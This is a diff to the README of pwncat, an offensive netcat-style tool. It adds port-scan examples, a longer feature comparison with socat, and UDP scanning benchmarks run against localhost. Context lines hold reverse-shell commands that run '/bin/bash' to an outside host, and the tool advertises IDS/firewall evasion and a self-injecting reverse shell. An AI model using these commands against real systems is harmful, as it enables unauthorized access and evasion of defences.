@@ -25,7 +25,7 @@
 
 
 > &nbsp;
-> #### Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python ([PSE](pse/)).
+> #### Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell, forwarding magic and insanely fast UDP port scanning - and its fully scriptable with Python ([PSE](pse/)).
 > &nbsp;
 
 | :warning: Warning: it is currently in feature-incomplete alpha state. Expect bugs and options to change. ([Roadmap](https://github.com/cytopia/pwncat/issues/2)) |
@@ -134,7 +134,7 @@
  </tbody>
 <table>
 
-> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 94.15%)</strong></sup><br/>
+> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 93.61%)</strong></sup><br/>
 > <sup>[2] Linux builds are currently only failing, due to loss of IPv6 support: <a href="https://github.com/actions/virtual-environments/issues/929">Issue</a></sup><br/>
 > <sup>[3] Windows builds are currently only failing, because they are simply stuck on GitHub actions: <a href="https://github.com/actions/virtual-environments/issues/917">Issue</a></sup>
 
@@ -211,6 +211,23 @@ pwncat -e '/bin/bash' example.com 4444 --reconn --recon-wait 1
 pwncat -e '/bin/bash' example.com 4444 -u --ping-intvl 1
 ```
 
+### Port scan
+```bash
+# [TCP] IPv4 + IPv6
+pwncat -z 10.0.0.1 80,443,8080
+pwncat -z 10.0.0.1 1-65535
+pwncat -z 10.0.0.1 1+1023
+
+# [UDP] IPv4 + IPv6 (insanely fast)
+pwncat -z 10.0.0.1 80,443,8080 -u
+pwncat -z 10.0.0.1 1-65535 -u
+pwncat -z 10.0.0.1 1+1023 -u
+
+# Use only IPv6 or IPv4
+pwncat -z 10.0.0.1 1-65535 -4
+pwncat -z 10.0.0.1 1-65535 -6 -u
+```
+
 ### Local port forward `-L` (listening proxy)
 ```bash
 # Make remote MySQL server (remote port 3306) available on current machine
@@ -246,6 +263,7 @@ pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
 | Feature        | Description |
 |----------------|-------------|
 | [PSE](pse)        | Fully scriptable with Pwncat Scripting Engine to allow all kinds of fancy stuff on send and receive |
+| Insanely fast port scanning | Up to 21x faster scanning a the full range of UDP ports than nmap |
 | Self-injecting rshell | Self-injecting mode to deploy itself and start an unbreakable reverse shell back to you automatically |
 | Bind shell        | Create bind shells |
 | Reverse shell     | Create reverse shells |
@@ -260,44 +278,45 @@ pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
 | IPv4 / IPv6       | Dual or single stack IPv4 and IPv6 support |
 | Python 2+3        | Works with Python 2, Python 3, pypy2 and pypy3 |
 | Cross OS          | Work on Linux, MacOS and Windows as long as Python is available |
-| Compatability     | Use the traditional `netcat` as a client or server together with `pwncat` |
+| Compatability     | Use the `netcat`, `ncat` or `socat` as a client or server together with `pwncat` |
 | Portable          | Single file which only uses core packages - no external dependencies required. |
 
 
 ### Feature comparison matrix
 
-|                     | pwncat | netcat | ncat |
-|---------------------|--------|---------|-----|
-| Scripting engine    | Python | :x:     | Lua |
-| Self-injecting      | ✔      | :x:     | :x: |
-| IP ToS              | ✔      | ✔       | :x: |
-| IPv4                | ✔      | ✔       | ✔   |
-| IPv6                | ✔      | ✔       | ✔   |
-| Unix domain sockets | :x:    | ✔       | ✔   |
-| Socket source bind  | ✔      | ✔       | ✔   |
-| TCP                 | ✔      | ✔       | ✔   |
-| UDP                 | ✔      | ✔       | ✔   |
-| SCTP                | :x:    | :x:     | ✔   |
-| Command exec        | ✔      | ✔       | ✔   |
-| Inbound port scan   | *      | ✔       | ✔   |
-| Outbound port scan  | ✔      | :x:     | :x: |
-| Hex dump            | *      | ✔       | ✔   |
-| Telnet              | :x:    | ✔       | ✔   |
-| SSL                 | :x:    | :x:     | ✔   |
-| HTTP                | *      | :x:     | :x: |
-| HTTPS               | *      | :x:     | :x: |
-| Chat                | ✔      | ✔       | ✔   |
-| Broker              | :x:    | :x:     | ✔   |
-| Simultaneous conns  | :x:    | :x:     | ✔   |
-| Allow/deny          | :x:    | :x:     | ✔   |
-| Local port forward  | ✔      | :x:     | :x: |
-| Remote port forward | ✔      | :x:     | :x: |
-| Re-accept           | ✔      | ✔       | ✔   |
-| Proxy               | :x:    | ✔       | ✔   |
-| UDP reverse shell   | ✔      | :x:     | :x: |
-| Respawning client   | ✔      | :x:     | :x: |
-| Port hopping        | ✔      | :x:     | :x: |
-| Emergency shutdown  | ✔      | :x:     | :x: |
+|                     | pwncat   | netcat | ncat  | socat |
+|---------------------|----------|--------|-------|-------|
+| Scripting engine    | ✔ Python | :x:    | ✔ Lua | :x:   |
+| IP ToS              | ✔        | ✔      | :x:   | ✔     |
+| IPv4                | ✔        | ✔      | ✔     | ✔     |
+| IPv6                | ✔        | ✔      | ✔     | ✔     |
+| Unix domain sockets | :x:      | ✔      | ✔     | ✔     |
+| Linux vsock         | :x:      | :x:    | ✔     | :x:   |
+| Socket source bind  | ✔        | ✔      | ✔     | ✔     |
+| TCP                 | ✔        | ✔      | ✔     | ✔     |
+| UDP                 | ✔        | ✔      | ✔     | ✔     |
+| SCTP                | :x:      | :x:    | ✔     | ✔     |
+| SSL                 | :x:      | :x:    | ✔     | ✔     |
+| HTTP                | *        | :x:    | :x:   | :x:   |
+| HTTPS               | *        | :x:    | :x:   | :x:   |
+| Telnet              | :x:      | ✔      | ✔     | :x:   |
+| Chat                | ✔        | ✔      | ✔     | ✔     |
+| Proxy               | :x:      | ✔      | ✔     | ✔     |
+| Command execution   | ✔        | ✔      | ✔     | ✔     |
+| Inbound port scan   | ✔        | ✔      | ✔     | :x:   |
+| Outbound port scan  | ✔        | :x:    | :x:   | :x:   |
+| Hex dump            | *        | ✔      | ✔     | ✔     |
+| Broker              | :x:      | :x:    | ✔     | :x:   |
+| Simultaneous conns  | :x:      | :x:    | ✔     | ✔     |
+| Allow/deny          | :x:      | :x:    | ✔     | ✔     |
+| Local port forward  | ✔        | :x:    | :x:   | ✔     |
+| Remote port forward | ✔        | :x:    | :x:   | :x:   |
+| Re-accept           | ✔        | ✔      | ✔     | ✔     |
+| Self-injecting      | ✔        | :x:    | :x:   | :x:   |
+| UDP reverse shell   | ✔        | :x:    | :x:   | :x:   |
+| Respawning client   | ✔        | :x:    | :x:   | :x:   |
+| Port hopping        | ✔        | :x:    | :x:   | :x:   |
+| Emergency shutdown  | ✔        | :x:    | :x:   | :x:   |
 
 > <sup>`*` Feature is currently under development.
 
@@ -380,8 +399,15 @@ endoint is lost, pwncat will quit. See advanced options for how to automatically
 reconnect.
 
 positional arguments:
-  hostname              Address to listen, forward or connect to
-  port                  Port to listen, forward or connect to
+  hostname              Address to listen, forward or connect to.
+
+  port                  [All modes]
+                        Single port to listen, forward or connect to.
+                        [Zero-I/O mode]
+                        Specify multiple ports to scan:
+                        Via list:  4444,4445,4446
+                        Via range: 4444-4446
+                        Via incr:  4444+2
 
 mode arguments:
   -l, --listen          [Listen mode]:
@@ -1120,6 +1146,86 @@ pwncat -vvvv -l localhost 4444 \
 pwncat -vvvv localhost 4444 \
   --script-send pse/http-post/pse-http_post-pack.py \
   --script-recv pse/http-post/pse-http_post-unpack.py
+```
+
+### Insanely fast UDP port scanning
+
+#### Average results
+
+Tests were run 10x for each tool against localhost and may vary over remote networks.
+
+|                      | pwncat | netcat | nmap <sup>[1]</sup>  |
+|----------------------|--------|--------|-------|
+| UDP scan time        | 8s     | 18s    | 2m53s |
+| UDP ports discovered | 5      | 5      | 5     |
+
+> **Note:** On TCP `nmap` is about 6.5x faster than `pwncat`.
+> <sup>[1]</sup> Also note that `nmap` does additional version detection which I was not able to disable. If you know some arguments that make `nmap` faster on UDP, please let me know.
+
+The following UDP ports had listeners:
+```bash
+$ sudo netstat -ulpn
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address
+udp        0      0 0.0.0.0:631             0.0.0.0:*
+udp        0      0 0.0.0.0:5353            0.0.0.0:*
+udp        0      0 0.0.0.0:39856           0.0.0.0:*
+udp        0      0 0.0.0.0:68              0.0.0.0:*
+udp        0      0 0.0.0.0:68              0.0.0.0:*
+udp6       0      0 :::1053                 :::*
+udp6       0      0 :::5353                 :::*
+udp6       0      0 :::57728                :::*
+```
+
+#### nmap
+```bash
+$ time sudo nmap -T5 localhost --version-intensity 0 -p- -sU
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-24 17:03 CEST
+Warning: 127.0.0.1 giving up on port because retransmission cap hit (2).
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000035s latency).
+Other addresses for localhost (not scanned): ::1
+Not shown: 65529 closed ports
+PORT      STATE         SERVICE
+68/udp    open|filtered dhcpc
+631/udp   open|filtered ipp
+1053/udp  open|filtered remote-as
+5353/udp  open|filtered zeroconf
+39856/udp open|filtered unknown
+40488/udp open|filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 179.15 seconds
+
+real    2m52.446s
+user    0m0.844s
+sys     0m2.571s
+```
+#### netcat
+```bash
+$ time nc  -z localhost 1-65535  -u -4 -v
+Connection to localhost 68 port [udp/bootpc] succeeded!
+Connection to localhost 631 port [udp/ipp] succeeded!
+Connection to localhost 1053 port [udp/*] succeeded!
+Connection to localhost 5353 port [udp/mdns] succeeded!
+Connection to localhost 39856 port [udp/*] succeeded!
+
+real    0m18.734s
+user    0m1.004s
+sys     0m2.634s
+```
+#### pwncat
+```bash
+$ time pwncat -z localhost 1-65535 -u -4
+Scanning 65535 ports
+[+]    68/UDP open   (IPv4)
+[+]   631/UDP open   (IPv4)
+[+]  1053/UDP open   (IPv4)
+[+]  5353/UDP open   (IPv4)
+[+] 39856/UDP open   (IPv4)
+
+real    0m7.309s
+user    0m6.465s
+sys     0m4.794s
 ```
 
 
